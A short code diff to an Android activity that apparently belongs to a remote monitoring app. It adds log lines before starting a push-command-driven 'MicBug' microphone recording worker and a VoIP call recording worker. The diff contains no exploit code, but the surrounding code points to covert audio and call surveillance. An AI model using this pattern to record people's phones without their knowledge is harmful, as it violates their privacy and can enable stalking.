@@ -126,6 +126,7 @@ class BackgroundServicesActivity : AppCompatActivity() {
                 micIntent.putExtra(MicBugCommandProcessingBaseI.MIC_BUG_PUSH, micBugCommand)
                 if (!AppUtils.isServiceRunning(this, MicBugCommandWorker::class.java.name)) {
                     //AppUtils.startService(this, micIntent)
+                    logVerbose("Micbug worker called from activity", "MicBugProcessInfo")
                     FutureWorkUtil.startMicRecordingWorker(this, gson.toJson(micBugCommand))
                 }
             }
@@ -242,6 +243,7 @@ class BackgroundServicesActivity : AppCompatActivity() {
 //                                voipCallRecord
 //                            )
 //                    )
+                    logVerbose("Calling voip call recording worker from activity", "VoipCallRecordingInfo")
                     FutureWorkUtil.startVoipCallRecordingWorker(this, gson.toJson(voipCallRecord))
                 }
             }
